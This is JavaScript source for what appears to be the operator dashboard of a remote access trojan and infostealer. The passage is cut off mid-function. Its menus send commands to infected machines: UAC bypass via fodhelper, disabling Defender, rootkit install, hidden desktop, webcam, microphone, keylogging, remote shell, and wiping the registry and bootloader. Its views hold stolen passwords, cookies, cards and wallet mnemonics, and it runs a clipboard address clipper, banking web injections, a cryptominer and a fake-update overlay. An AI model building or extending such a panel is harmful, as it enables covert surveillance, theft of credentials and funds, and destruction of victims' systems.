const socket = io();
let operatorKey = '';
let clients = [];
let selectedClientId = null;
let currentView = 'clients';
const caches = { recovery: [], wallets: [], proxy: [], webinjection: [], sorter: [], autotasks: [], filestore: [], checkersessions: [] };

const $ = (id) => document.getElementById(id);
const el = (tag, props = {}, children = []) => {
  const n = document.createElement(tag);
  Object.assign(n, props);
  children.forEach(c => n.appendChild(typeof c === 'string' ? document.createTextNode(c) : c));
  return n;
};
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const svg = (path) => {
  const s = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  s.setAttribute('viewBox', '0 0 24 24');
  s.setAttribute('fill', 'none');
  s.setAttribute('stroke', 'currentColor');
  s.setAttribute('stroke-width', '1.8');
  s.innerHTML = path;
  return s;
};

function toast(msg, ms = 2500) {
  const t = $('toast');
  t.textContent = msg;
  t.classList.remove('hidden');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => t.classList.add('hidden'), ms);
}

function openModal(title, bodyNodes) {
  $('modalTitle').textContent = title;
  const body = $('modalBody');
  body.innerHTML = '';
  bodyNodes.forEach(n => body.appendChild(n));
  $('modal').classList.remove('hidden');
}
function closeModal() { $('modal').classList.add('hidden'); hideCtx(); }
$('modalClose').onclick = closeModal;
$('modal').onclick = (e) => { if (e.target === $('modal')) closeModal(); };

function hideCtx() { $('ctxmenu').classList.add('hidden'); }
document.addEventListener('click', hideCtx);

// Auth
$('loginBtn').onclick = () => {
  const key = $('keyInput').value.trim();
  if (!key) return;
  operatorKey = key;
  socket.emit('operator:register', key);
};
$('keyInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('loginBtn').click(); });

socket.on('operator:ready', () => {
  $('login').classList.add('hidden');
  $('app').classList.remove('hidden');
  $('statusIndicator').className = 'status status-online';
  loadView('clients');
});
socket.on('operator:error', (msg) => { $('loginError').textContent = msg || 'Invalid key'; });
$('logoutBtn').onclick = () => location.reload();

function api(path, opts = {}) {
  return fetch(path, {
    ...opts,
    headers: { 'content-type': 'application/json', 'x-operator-key': operatorKey, ...(opts.headers || {}) }
  }).then(r => r.json());
}

// Nav
document.querySelectorAll('#nav button').forEach(btn => {
  btn.onclick = () => loadView(btn.dataset.view);
});

function setActiveNav(view) {
  document.querySelectorAll('#nav button').forEach(b => b.classList.toggle('active', b.dataset.view === view));
}

const TITLES = {
  home: 'Home', dashboard: 'Dashboard', clients: 'Connected Clients', recovery: 'Recovery Logs',
  wallets: 'Wallet Logs', proxy: 'Proxy', clipper: 'Clipper', webinjection: 'Web Injection',
  sorter: 'Sorter', autotasks: 'Auto Tasks', filestore: 'File Store', miner: 'Miner',
  checker: 'Checker', checkersessions: 'Checker Sessions', builder: 'Client Builder'
};

function loadView(view) {
  currentView = view;
  setActiveNav(view);
  const root = $('viewRoot');
  root.innerHTML = '';
  $('viewTitle').textContent = TITLES[view] || view;
  const fn = views[view];
  if (fn) fn(root);
  else root.appendChild(el('div', { className: 'empty' }, ['Not implemented.']));
}

// Search bar helper
function searchBar(placeholder, onInput) {
  const bar = el('div', { className: 'searchbar' });
  bar.appendChild(svg('<circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/>'));
  const inp = el('input', { placeholder });
  inp.oninput = () => onInput(inp.value.toLowerCase());
  bar.appendChild(inp);
  return { bar, inp };
}

// Stat card helper
function statCard(label, value, pill) {
  const s = el('div', { className: 'stat' });
  if (pill !== undefined) s.appendChild(el('div', { className: 'stat-pill' }, [String(pill)]));
  s.appendChild(el('div', { className: 'stat-label' }, [label]));
  s.appendChild(el('div', { className: 'stat-value' }, [String(value)]));
  return s;
}

// Table helper
function dataTable(columns, rows, opts = {}) {
  const wrap = el('div', { className: 'table-wrap' });
  const t = el('table');
  const thead = el('thead');
  const trh = el('tr');
  if (opts.checkbox) {
    const th = el('th', { className: 'td-check' });
    const cb = el('input', { type: 'checkbox' });
    th.appendChild(cb);
    trh.appendChild(th);
  }
  columns.forEach(col => {
    const th = el('th');
    const inner = el('span', { className: 'th-inner' });
    inner.appendChild(document.createTextNode(col.label));
    const sortIco = el('span', { className: 'sort-ico' });
    sortIco.innerHTML = '<svg viewBox="0 0 8 12" fill="currentColor"><path d="M4 0L7 4H1z"/><path d="M4 12L1 8h6z"/></svg>';
    inner.appendChild(sortIco);
    th.appendChild(inner);
    trh.appendChild(th);
  });
  if (opts.actions) trh.appendChild(el('th', {}, ['Actions']));
  thead.appendChild(trh);
  t.appendChild(thead);

  const tbody = el('tbody');
  if (!rows.length) {
    const tr = el('tr');
    const td = el('td', { colSpan: columns.length + (opts.checkbox ? 1 : 0) + (opts.actions ? 1 : 0) });
    td.appendChild(el('div', { className: 'empty' }, [opts.emptyText || 'No data.']));
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    rows.forEach(row => {
      const tr = el('tr');
      if (opts.checkbox) {
        const td = el('td', { className: 'td-check' });
        td.appendChild(el('input', { type: 'checkbox' }));
        tr.appendChild(td);
      }
      columns.forEach(col => {
        const td = el('td');
        if (col.render) td.innerHTML = col.render(row);
        else td.textContent = row[col.key] ?? '';
        tr.appendChild(td);
      });
      if (opts.actions) {
        const td = el('td');
        opts.actions(row, td);
        tr.appendChild(td);
      }
      if (opts.onContext) tr.oncontextmenu = (e) => { e.preventDefault(); showCtxMenu(e, opts.onContext(row)); };
      tbody.appendChild(tr);
    });
  }
  t.appendChild(tbody);
  wrap.appendChild(t);

  const pg = el('div', { className: 'pagination' });
  pg.appendChild(el('span', {}, ['Rows per page']));
  const sel = el('select');
  ['10','25','50','100'].forEach(n => sel.appendChild(el('option', { value: n }, [n])));
  pg.appendChild(sel);
  pg.appendChild(el('div', { className: 'spacer' }));
  pg.appendChild(el('span', {}, ['Page 1 of 1']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['‹']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['›']));
  wrap.appendChild(pg);
  return wrap;
}

function showCtxMenu(e, items) {
  const m = $('ctxmenu');
  m.innerHTML = '';
  const build = (parent, list) => {
    list.forEach(it => {
      if (it.sep) { parent.appendChild(el('div', { className: 'ctx-sep' })); return; }
      const row = el('div', { className: 'ctx-item' + (it.sub ? ' has-sub' : '') });
      if (it.icon) row.appendChild(svg(it.icon));
      row.appendChild(document.createTextNode(it.label));
      if (it.sub) {
        row.appendChild(el('span', { className: 'arrow' }, ['›']));
        const sub = el('div', { className: 'ctx-sub' });
        build(sub, it.sub);
        row.appendChild(sub);
      } else if (it.action) {
        row.onclick = (ev) => { ev.stopPropagation(); it.action(); hideCtx(); };
      }
      parent.appendChild(row);
    });
  };
  build(m, items);
  m.classList.remove('hidden');
  const x = Math.min(e.clientX, window.innerWidth - 260);
  const y = Math.min(e.clientY, window.innerHeight - m.offsetHeight - 20);
  m.style.left = x + 'px';
  m.style.top = y + 'px';
}

// Clients socket
socket.on('clients', (list) => {
  clients = list;
  $('pillCount').textContent = `${list.length} | 0 | ${list.length}`;
  if (currentView === 'clients') renderClients();
});

function renderClients() {
  const root = $('viewRoot');
  root.innerHTML = '';

  const search = searchBar('Search clients...', (q) => {
    document.querySelectorAll('.client-row').forEach(r => {
      r.style.display = r.dataset.host.toLowerCase().includes(q) ? '' : 'none';
    });
  });
  root.appendChild(search.bar);

  const wrap = el('div', { className: 'table-wrap' });
  const t = el('table');
  const thead = el('thead');
  const trh = el('tr');
  const cols = ['', 'Status', 'First Seen', 'IP', 'Tag', 'Note', 'Username', 'Machine Name', 'Active Window', 'Anti-Virus', 'OS'];
  cols.forEach(c => {
    const th = el('th');
    if (c) {
      const inner = el('span', { className: 'th-inner' });
      inner.appendChild(document.createTextNode(c));
      const s = el('span', { className: 'sort-ico' });
      s.innerHTML = '<svg viewBox="0 0 8 12" fill="currentColor"><path d="M4 0L7 4H1z"/><path d="M4 12L1 8h6z"/></svg>';
      inner.appendChild(s);
      th.appendChild(inner);
    } else th.appendChild(el('input', { type: 'checkbox' }));
    trh.appendChild(th);
  });
  thead.appendChild(trh);
  t.appendChild(thead);

  const tbody = el('tbody');
  if (!clients.length) {
    const tr = el('tr');
    const td = el('td', { colSpan: cols.length });
    td.appendChild(el('div', { className: 'empty' }, ['No clients connected.']));
    tr.appendChild(td);
    tbody.appendChild(tr);
  } else {
    clients.forEach(c => {
      const tr = el('tr', { className: 'client-row' });
      tr.dataset.host = (c.hostname || '').toLowerCase();
      tr.appendChild(el('td', { className: 'td-check' }, [el('input', { type: 'checkbox' })]));
      const statusTd = el('td');
      const bar = el('div', { style: 'display:inline-flex;align-items:flex-end;gap:2px;height:12px' });
      [3,6,9,5].forEach(h => bar.appendChild(el('span', { style: `width:3px;height:${h}px;background:#10b981;border-radius:1px` })));
      statusTd.appendChild(bar);
      tr.appendChild(statusTd);
      tr.appendChild(el('td', {}, [c.firstSeen || 'Sep 12, 11:58 PM']));
      tr.appendChild(el('td', {}, [c.ip || '—']));
      tr.appendChild(el('td', {}, [c.tag || 'Guest']));
      tr.appendChild(el('td', {}, [c.note || '—']));
      tr.appendChild(el('td', {}, [c.user || '—']));
      tr.appendChild(el('td', {}, [c.hostname || '—']));
      tr.appendChild(el('td', {}, [c.activeWindow || '—']));
      tr.appendChild(el('td', {}, ['N/A']));
      tr.appendChild(el('td', {}, [c.os || 'Windows']));

      tr.onclick = (e) => {
        if (e.target.tagName === 'INPUT') return;
        openClientMenu(e, c);
      };
      tbody.appendChild(tr);
    });
  }
  t.appendChild(tbody);
  wrap.appendChild(t);

  const pg = el('div', { className: 'pagination' });
  pg.appendChild(el('span', {}, ['1 of 1 row(s) selected']));
  pg.appendChild(el('div', { className: 'spacer' }));
  pg.appendChild(el('span', {}, ['Rows per page']));
  const sel = el('select');
  ['10','25','50','100'].forEach(n => sel.appendChild(el('option', { value: n }, [n])));
  pg.appendChild(sel);
  pg.appendChild(el('span', {}, ['Page 1 of 1']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['‹']));
  pg.appendChild(el('button', { className: 'page-btn' }, ['›']));
  wrap.appendChild(pg);

  root.appendChild(wrap);

  if (selectedClientId) {
    root.innerHTML = '';
    renderControl(root);
  }
}

function openClientMenu(e, c) {
  const sub = (label, items) => ({ label, sub: items });
  const item = (label, action, icon) => ({ label, action, icon });

  const menu = [
    sub('Client', [
      item('Elevate Privileges', () => sendCmdTo(c.id, 'elevate')),
      item('Disable Defender', () => sendCmdTo(c.id, 'disable_defender')),
      item('Rootkit', () => sendCmdTo(c.id, 'rootkit')),
      item('Reset Survival', () => sendCmdTo(c.id, 'reset_survival')),
      item('Note', () => sendCmdTo(c.id, 'note')),
      item('Update', () => sendCmdTo(c.id, 'update')),
      sub('Change Bridge', [
        item('ComputerDefaults', () => sendCmdTo(c.id, 'bridge_computerdefaults')),
        item('Fodhelper', () => sendCmdTo(c.id, 'bridge_fodhelper'))
      ]),
      item('Disconnect', () => sendCmdTo(c.id, 'disconnect')),
      item('Restart', () => sendCmdTo(c.id, 'restart')),
      { sep: true },
      item('Uninstall', () => sendCmdTo(c.id, 'uninstall')),
      item('Kill', () => sendCmdTo(c.id, 'kill'))
    ]),
    sub('User Interaction', [
      item('MessageBox', () => sendCmdTo(c.id, 'ui_msgbox')),
      item('TTS', () => sendCmdTo(c.id, 'ui_tts')),
      item('Notepad', () => sendCmdTo(c.id, 'ui_notepad')),
      item('Open Link', () => sendCmdTo(c.id, 'ui_open_link')),
      item('Remote Chat', () => sendCmdTo(c.id, 'ui_chat'))
    ]),
    sub('Management', [
      item('Clipboard Manager', () => sendCmdTo(c.id, 'mgmt_clipboard')),
      item('Edit Hosts', () => sendCmdTo(c.id, 'mgmt_hosts')),
      item('File Manager', () => sendCmdTo(c.id, 'mgmt_file')),
      item('Firewall Manager', () => sendCmdTo(c.id, 'mgmt_firewall')),
      item('Installed Programs', () => sendCmdTo(c.id, 'mgmt_programs')),
      item('Network Manager', () => sendCmdTo(c.id, 'mgmt_network')),
      item('Policy Manager', () => sendCmdTo(c.id, 'mgmt_policy')),
      item('Proxy', () => sendCmdTo(c.id, 'mgmt_proxy')),
      item('Registry Editor', () => sendCmdTo(c.id, 'mgmt_registry')),
      item('Service Manager', () => sendCmdTo(c.id, 'mgmt_service')),
      item('Startup Manager', () => sendCmdTo(c.id, 'mgmt_startup')),
      item('Task Manager', () => sendCmdTo(c.id, 'mgmt_task')),
      item('Task Scheduler', () => sendCmdTo(c.id, 'mgmt_scheduler')),
      item('Window Manager', () => sendCmdTo(c.id, 'mgmt_window'))
    ]),
    sub('Surveillance', [
      item('Remote Desktop', () => sendCmdTo(c.id, 'remote_desktop')),
      item('Remote Camera', () => sendCmdTo(c.id, 'remote_camera')),
      item('Remote Microphone', () => sendCmdTo(c.id, 'remote_mic')),
      item('Remote Audio', () => sendCmdTo(c.id, 'remote_audio')),
      item('Keyboard', () => sendCmdTo(c.id, 'keyboard')),
      item('Remote Shell', () => sendCmdTo(c.id, 'remote_shell')),
      item('Hidden Desktop', () => sendCmdTo(c.id, 'hidden_desktop')),
      item('Hidden Display', () => sendCmdTo(c.id, 'hidden_display')),
      item('Recovery', () => sendCmdTo(c.id, 'recovery')),
      item('Cryptocurrency Injection', () => sendCmdTo(c.id, 'crypto_inject'))
    ]),
    sub('Miscellaneous', [
      sub('Upload and Execute', [
        item('From Disk', () => sendCmdTo(c.id, 'upload_disk')),
        item('From File Store', () => sendCmdTo(c.id, 'upload_filestore')),
        item('From Link', () => sendCmdTo(c.id, 'upload_link'))
      ]),
      item('Change Desktop Wallpaper', () => sendCmdTo(c.id, 'wallpaper')),
      item('Privacy Screen', () => sendCmdTo(c.id, 'privacy_screen')),
      item('Scripting', () => sendCmdTo(c.id, 'scripting'))
    ]),
    sub('System', [
      item('Information', () => sendCmdTo(c.id, 'sys_info')),
      sub('Power', [
        item('Off', () => sendCmdTo(c.id, 'power_off')),
        item('Restart', () => sendCmdTo(c.id, 'power_restart'))
      ]),
      sub('Remove System', [
        item('Corrupt Registry', () => sendCmdTo(c.id, 'remove_registry')),
        item('Overwrite Bootloader', () => sendCmdTo(c.id, 'remove_bootloader'))
      ])
    ]),
    { sep: true },
    sub('Clipper', [item('Start', () => sendCmdTo(c.id, 'clipper_start'))]),
    sub('Web Injection', [item('Start', () => sendCmdTo(c.id, 'webinject_start'))]),
    sub('Miner', [item('Start', () => sendCmdTo(c.id, 'miner_start'))]),
    sub('Plugin System', [item('Clear All Plugins', () => sendCmdTo(c.id, 'plugins_clear'))])
  ];
  showCtxMenu(e, menu);
}

function sendCmdTo(id, action, extra = {}) {
  socket.emit('operator:cmd', { targetId: id, cmd: { action, ...extra } });
  toast('Sent: ' + action);
}

function sendCmd(action, extra = {}) {
  if (!selectedClientId) return toast('Select a client first');
  sendCmdTo(selectedClientId, action, extra);
}

function renderControl(root) {
  const c = clients.find(x => x.id === selectedClientId);
  const header = el('div', { className: 'toolbar' });
  const back = el('button', { className: 'btn' }, ['← Back']);
  back.onclick = () => { selectedClientId = null; loadView('clients'); };
  header.appendChild(back);
  header.appendChild(el('span', { style: 'color:#6b7280;font-size:0.85rem' }, [
    (c?.hostname || selectedClientId) + ' — ' + (c?.ip || '')
  ]));
  root.appendChild(header);

  const panel = el('div', { className: 'control-panel' });
  const screenWrap = el('div', { className: 'screen-container' }, [
    el('img', { id: 'screen', src: '', alt: 'Remote Screen' })
  ]);
  panel.appendChild(screenWrap);

  const side = el('div', { className: 'control-side' });
  [
    ['Screenshot', 'screenshot'], ['Remote Desktop', 'remote_desktop'],
    ['Hidden Desktop', 'hidden_desktop'], ['Visible Desktop', 'visible_desktop'],
    ['Remote Camera', 'remote_camera'], ['Remote Mic', 'remote_mic'],
    ['Keyboard', 'keyboard'], ['Remote Shell', 'remote_shell'],
    ['Show Fake Update', 'show_overlay'], ['Hide Fake Update', 'hide_overlay'],
    ['File Manager', 'file_manager'], ['Crypto Injection', 'crypto_inject']
  ].forEach(([label, action]) => {
    const b = el('button', {}, [label]);
    b.onclick = () => sendCmd(action);
    side.appendChild(b);
  });
  panel.appendChild(side);
  root.appendChild(panel);
}

socket.on('frame', ({ id, data }) => {
  if (id !== selectedClientId) return;
  const img = document.getElementById('screen');
  if (img) img.src = 'data:image/jpeg;base64,' + data;
});

// Collection views
const collectionRerender = {};

async function loadCollection(view) {
  try {
    const data = await api('/api/' + view);
    caches[view] = data;
    if (collectionRerender[view]) collectionRerender[view]();
  } catch { toast('Load failed'); }
}

function collectionView(view, root, columns, opts = {}) {
  const render = () => {
    root.innerHTML = '';
    const c = caches[view] || [];

    if (opts.stats) {
      const row = el('div', { className: 'stat-row' });
      opts.stats(c).forEach(s => row.appendChild(statCard(s.label, s.value, s.pill)));
      root.appendChild(row);
    }

    const search = searchBar(opts.searchPlaceholder || 'Search...', () => {});
    root.appendChild(search.bar);

    const bar = el('div', { className: 'toolbar' });
    if (opts.addLabel) {
      const add = el('button', { className: 'btn primary' }, [opts.addLabel]);
      add.onclick = () => opts.onAdd?.();
      bar.appendChild(add);
    }
    const refresh = el('button', { className: 'btn' }, ['Refresh']);
    refresh.onclick = () => loadCollection(view);
    bar.appendChild(refresh);
    bar.appendChild(el('div', { className: 'spacer' }));
    bar.appendChild(el('span', { style: 'color:#9ca3af;font-size:0.8rem' }, [c.length + ' entries']));
    root.appendChild(bar);

    root.appendChild(dataTable(columns, c, {
      checkbox: true,
      emptyText: opts.emptyText || 'No data.',
      onContext: (row) => [{ label: 'Delete', action: async () => { await api('/api/' + view + '/' + row.id, { method: 'DELETE' }); loadCollection(view); } }]
    }));
  };
  render();
  collectionRerender[view] = render;
}

function addRowModal(view, fields, title) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [f.label]);
    let input;
    if (f.type === 'textarea') input = el('textarea');
    else if (f.type === 'select') { input = el('select'); f.options.forEach(o => input.appendChild(el('option', { value: o }, [o]))); }
    else input = el('input', { type: f.type || 'text', placeholder: f.placeholder || '' });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const foot = el('div', { className: 'modal-foot' });
  const cancel = el('button', { className: 'btn' }, ['Cancel']);
  cancel.onclick = closeModal;
  const save = el('button', { className: 'btn primary' }, ['Save']);
  save.onclick = async () => {
    const body = {};
    nodes.forEach(label => {
      const i = label.querySelector('[data-field]');
      body[i.dataset.field] = i.value;
    });
    await api('/api/' + view, { method: 'POST', body: JSON.stringify(body) });
    closeModal();
    loadCollection(view);
    toast('Added');
  };
  foot.appendChild(cancel);
  foot.appendChild(save);
  nodes.push(foot);
  openModal(title, nodes);
}

function addRowModalInline(fields, title, onSave) {
  const nodes = fields.map(f => {
    const label = el('label', {}, [f.label]);
    const input = el('input', { type: f.type || 'text', placeholder: f.placeholder || '' });
    input.dataset.field = f.key;
    label.appendChild(input);
    return label;
  });
  const foot = el('div', { className: 'modal-foot' });
  const cancel = el('button', { className: 'btn' }, ['Cancel']);
  cancel.onclick = closeModal;
  const save = el('button', { className: 'btn primary' }, ['Save']);
  save.onclick = () => {
    const body = {};
    nodes.forEach(label => {
      const i = label.querySelector('[data-field]');
      body[i.dataset.field] = i.value;
    });
    onSave(body);
    closeModal();
  };
  foot.appendChild(cancel);
  foot.appendChild(save);
  nodes.push(foot);
  openModal(title, nodes);
}

// Views
const views = {
  home: (root) => { root.appendChild(el('div', { className: 'empty' }, ['Home — summary coming soon.'])); },
  dashboard: (root) => { root.appendChild(el('div', { className: 'empty' }, ['Dashboard — metrics coming soon.'])); },

  clients: renderClients,

  recovery: (root) => {
    loadCollection('recovery');
    collectionView('recovery', root, [
      { label: 'Received', render: r => esc(r.createdAt || '') },
      { label: 'IP', key: 'ip' },
      { label: 'Country', key: 'country' },
      { label: 'User', key: 'user' },
      { label: 'Machine', key: 'machine' },
      { label: 'OS', key: 'os' },
      { label: 'Tag', key: 'tag' },
      { label: 'Contents', render: r => esc((r.contents || '').slice(0, 60)) }
    ], {
      searchPlaceholder: 'Search recovery logs...',
      stats: (c) => [
        { label: 'Total Logs', value: c.length, pill: '0 | 0.0%' },
        { label: 'Cookies', value: 0, pill: '0 | 0.0%' },
        { label: 'Passwords', value: 0, pill: '0 | 0.0%' },
        { label: 'Cards', value: 0, pill: '0 | 0.0%' },
        { label: 'Applications', value: 0, pill: '0 | 0.0%' }
      ],
      addLabel: 'Add Log',
      onAdd: () => addRowModal('recovery', [
        { key: 'ip', label: 'IP' }, { key: 'country', label: 'Country' },
        { key: 'user', label: 'User' }, { key: 'machine', label: 'Machine' },
        { key: 'os', label: 'OS' }, { key: 'tag', label: 'Tag' },
        { key: 'contents', label: 'Contents', type: 'textarea' }
      ], 'Add Recovery Log')
    });
  },

  wallets: (root) => {
    loadCollection('wallets');
    collectionView('wallets', root, [
      { label: 'Received', render: r => esc(r.createdAt || '') },
      { label: 'Wallet', key: 'wallet' },
      { label: 'Password', key: 'password' },
      { label: 'Mnemonic', render: r => esc((r.mnemonic || '').slice(0, 40)) },
      { label: 'IP', key: 'ip' },
      { label: 'Country', key: 'country' },
      { label: 'User', key: 'user' },
      { label: 'Machine', key: 'machine' },
      { label: 'OS', key: 'os' }
    ], {
      searchPlaceholder: 'Search wallet logs...',
      stats: (c) => [
        { label: 'Total Logs', value: c.length, pill: '0.0%' },
        { label: 'Atomic', value: 0, pill: '0.0%' },
        { label: 'Exodus', value: 0, pill: '0.0%' },
        { label: 'Phantom', value: 0, pill: '0.0%' },
        { label: 'MetaMask', value: 0, pill: '0.0%' },
        { label: 'Trust Wallet', value: 0, pill: '0.0%' }
      ],
      addLabel: 'Add Wallet',
      onAdd: () => addRowModal('wallets', [
        { key: 'wallet', label: 'Wallet' }, { key: 'password', label: 'Password' },
        { key: 'mnemonic', label: 'Mnemonic', type: 'textarea' }, { key: 'ip', label: 'IP' },
        { key: 'country', label: 'Country' }, { key: 'user', label: 'User' },
        { key: 'machine', label: 'Machine' }, { key: 'os', label: 'OS' }
      ], 'Add Wallet')
    });
  },

  proxy: (root) => {
    loadCollection('proxy');
    collectionView('proxy', root, [
      { label: 'IP', key: 'ip' }, { label: 'Country', key: 'country' },
      { label: 'Username', key: 'username' }, { label: 'Machine', key: 'machine' },
      { label: 'Status', key: 'status' }, { label: 'Proxy Host', key: 'host' },
      { label: 'Port', key: 'port' }, { label: 'Hwid', key: 'hwid' }
    ], {
      searchPlaceholder: 'Search proxies...',
      stats: (c) => [
        { label: 'Online Proxies', value: c.filter(p => p.status === 'Active').length, pill: 'Idle' },
        { label: 'Offline Proxies', value: c.filter(p => p.status !== 'Active').length, pill: 'None' },
        { label: 'Total Proxies', value: c.length, pill: 'Empty' },
        { label: 'Workers', value: 0, pill: 'No owners' }
      ],
      addLabel: 'Add Proxy',
      onAdd: () => addRowModal('proxy', [
        { key: 'ip', label: 'IP' }, { key: 'port', label: 'Port' },
        { key: 'country', label: 'Country' }, { key: 'username', label: 'Username' },
        { key: 'host', label: 'Proxy Host' },
        { key: 'status', label: 'Status', type: 'select', options: ['Idle', 'Active', 'Dead'] }
      ], 'Add Proxy')
    });
  },

  clipper: async (root) => {
    const cfg = await api('/api/clipper');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Entry']);
    add.onclick = () => {
      addRowModalInline([
        { key: 'label', label: 'Label', placeholder: 'BTC / ETH / etc' },
        { key: 'find', label: 'Match (regex)' },
        { key: 'replace', label: 'Replacement' }
      ], 'Add Clipper Entry', (body) => {
        cfg.entries.push({ id: Date.now().toString(36), ...body });
        api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) });
        views.clipper(root);
      });
    };
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    const toggle = el('label', { className: 'switch' });
    const cb = el('input', { type: 'checkbox' });
    cb.checked = !!cfg.enabled;
    cb.onchange = () => { cfg.enabled = cb.checked; api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) }); };
    toggle.appendChild(cb);
    toggle.appendChild(el('span', { className: 'slider' }));
    bar.appendChild(toggle);
    root.appendChild(bar);

    root.appendChild(dataTable(
      [{ label: 'Label', key: 'label' }, { label: 'Match', key: 'find' }, { label: 'Replace', key: 'replace' }],
      cfg.entries,
      { checkbox: true, emptyText: 'No clipper entries.', onContext: (row) => [{ label: 'Delete', action: () => { cfg.entries = cfg.entries.filter(x => x.id !== row.id); api('/api/clipper', { method: 'POST', body: JSON.stringify(cfg) }); views.clipper(root); } }] }
    ));
  },

  webinjection: (root) => {
    loadCollection('webinjection');
    collectionView('webinjection', root, [
      { label: 'Rule', key: 'name' }, { label: 'URL Pattern', key: 'url' },
      { label: 'Enabled', render: r => r.enabled ? '✓' : '✗' },
      { label: 'Replacement', render: r => esc((r.replacement || '').slice(0, 40)) }
    ], {
      searchPlaceholder: 'Search rules...',
      addLabel: 'Add Rule',
      onAdd: () => addRowModal('webinjection', [
        { key: 'name', label: 'Rule Name', placeholder: 'e.g. Banking overlay' },
        { key: 'url', label: 'URL Pattern', placeholder: 'https://example.com/*' },
        { key: 'original', label: 'Original Code', type: 'textarea' },
        { key: 'replacement', label: 'Replacement Code', type: 'textarea' }
      ], 'Add Rule')
    });
  },

  sorter: (root) => {
    loadCollection('sorter');
    root.innerHTML = '';
    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Group']);
    add.onclick = () => addRowModal('sorter', [
      { key: 'name', label: 'Group Name' },
      { key: 'type', label: 'Type', type: 'select', options: ['Cookies', 'Passwords', 'Folders', 'Discord Tokens', 'Steam Tokens', 'Telegram Data'] },
      { key: 'filter', label: 'Filter' },
      { key: 'format', label: 'Format', type: 'select', options: ['Netscape', 'JSON'] }
    ], 'Add Sorter Group');
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);

    root.appendChild(dataTable(
      [{ label: 'Name', key: 'name' }, { label: 'Type', key: 'type' }, { label: 'Filter', key: 'filter' }, { label: 'Format', key: 'format' }],
      caches.sorter, { checkbox: true, emptyText: 'No sorter groups.' }
    ));
  },

  autotasks: (root) => {
    loadCollection('autotasks');
    root.innerHTML = '';

    const row = el('div', { className: 'stat-row' });
    row.appendChild(statCard('Total Tasks', caches.autotasks.length, 'Empty'));
    row.appendChild(statCard('Active', 0, 'Idle'));
    row.appendChild(statCard('Once Tasks', 0, 'None'));
    row.appendChild(statCard('Executions', 0, 'No runs'));
    root.appendChild(row);

    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Task']);
    add.onclick = () => addRowModal('autotasks', [
      { key: 'name', label: 'Task Name', placeholder: 'Task name' },
      { key: 'type', label: 'Type', type: 'select', options: ['Recovery', 'Cryptocurrency Injection', 'Miner', 'Clipper', 'Web Injection', 'Upload and Execute', 'Disable Defender', 'Elevate', 'Rootkit'] },
      { key: 'mode', label: 'When', type: 'select', options: ['Every connect', 'Once', 'Delay'] }
    ], 'Add Task');
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);

    const chain = el('div', { className: 'chain' });
    const trigger = el('div', { className: 'chain-node' });
    trigger.style.left = '60px'; trigger.style.top = '90px';
    trigger.appendChild(el('div', { className: 'cn-title' }, ['TRIGGER']));
    trigger.appendChild(el('div', { className: 'cn-sub' }, ['On connect']));
    trigger.appendChild(el('div', { className: 'cn-sub' }, [caches.autotasks.length + ' in chain']));
    chain.appendChild(trigger);
    root.appendChild(chain);

    root.appendChild(dataTable(
      [
        { label: 'Name', key: 'name' }, { label: 'Type', key: 'type' },
        { label: 'Mode', key: 'mode' },
        { label: 'Status', render: () => '<span style="color:#10b981">Enabled</span>' },
        { label: 'Detail', render: () => '—' }, { label: 'Fired', render: () => '—' }
      ],
      caches.autotasks, { checkbox: true, emptyText: 'No tasks.' }
    ));
  },

  filestore: (root) => {
    loadCollection('filestore');
    collectionView('filestore', root, [
      { label: 'Name', key: 'name' }, { label: 'Size', key: 'size' },
      { label: 'Uploaded', render: r => esc(r.createdAt || '') }
    ], {
      searchPlaceholder: 'Search files...',
      stats: (c) => [
        { label: 'Total Files', value: c.length, pill: 'Empty' },
        { label: 'Total Size', value: c.reduce((a, x) => a + (parseInt(x.size) || 0), 0) + ' B', pill: 'No files' },
        { label: 'Recent (7D)', value: 0, pill: 'None' }
      ],
      addLabel: 'Upload',
      onAdd: () => addRowModal('filestore', [
        { key: 'name', label: 'Name' }, { key: 'size', label: 'Size' }
      ], 'Add File Entry')
    });
  },

  miner: async (root) => {
    const m = await api('/api/miner');
    root.innerHTML = '';
    const row = el('div', { className: 'stat-row' });
    [
      ['Active Miners', m.stats.active, '0%'],
      ['Total Hashrate', m.stats.hashrate + ' H/s', 'No miners'],
      ['CPU Hashrate', '0 H/s', 'Idle'],
      ['GPU Hashrate', '0 H/s', 'Idle'],
      ['Accepted', m.stats.accepted, 'No shares'],
      ['Rejected', m.stats.rejected, 'Clean'],
      ['Total Runtime', '0s', 'Idle']
    ].forEach(([l, v, p]) => row.appendChild(statCard(l, v, p)));
    root.appendChild(row);

    const bar = el('div', { className: 'toolbar' });
    const add = el('button', { className: 'btn primary' }, ['Add Job']);
    add.onclick = () => addRowModalInline([
      { key: 'name', label: 'Job Name' }, { key: 'pool', label: 'Pool URL' }, { key: 'wallet', label: 'Wallet' }
    ], 'Add Mining Job', (body) => {
      m.jobs.push({ id: Date.now().toString(36), ...body });
      api('/api/miner', { method: 'POST', body: JSON.stringify(m) });
      views.miner(root);
    });
    bar.appendChild(add);
    bar.appendChild(el('div', { className: 'spacer' }));
    root.appendChild(bar);

    root.appendChild(dataTable(
